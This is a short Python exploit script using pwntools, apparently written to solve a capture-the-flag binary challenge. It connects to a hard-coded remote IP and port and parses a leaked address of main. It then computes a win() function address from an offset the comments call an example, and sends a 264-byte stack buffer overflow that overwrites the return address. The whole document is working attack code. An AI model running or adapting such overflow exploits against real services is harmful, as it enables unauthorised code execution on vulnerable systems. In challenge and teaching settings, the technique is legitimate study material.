from pwn import *

# Define remote host and port
remote_host = '143.198.227.172'  # Replace with the actual remote host IP address
remote_port = 32778        # Replace with the actual remote port number

# Establish connection to remote server
p = remote(remote_host, remote_port)

# Receive main address
p.recvuntil(b'main @ ')
main_addr = p.recvuntil(b'\n', drop=True).decode()
log.info(f"Main function address: {main_addr}")

# Calculate the win function offset (replace it with the actual offset)
offset = 104  # Example offset, replace it with the actual offset between main and win function

# Calculate win function address
win_addr = int(main_addr, 16) - offset
win_addr = p64(win_addr)

# Craft payload
payload = (b'A' * 264)  # Offset to return address
payload += win_addr     # Overwrite return address with the address of the win() function

# Send payload
p.sendline(payload)
p.recvline()
# Receive and print output
print(p.recvall())

# Close connection
p.close()
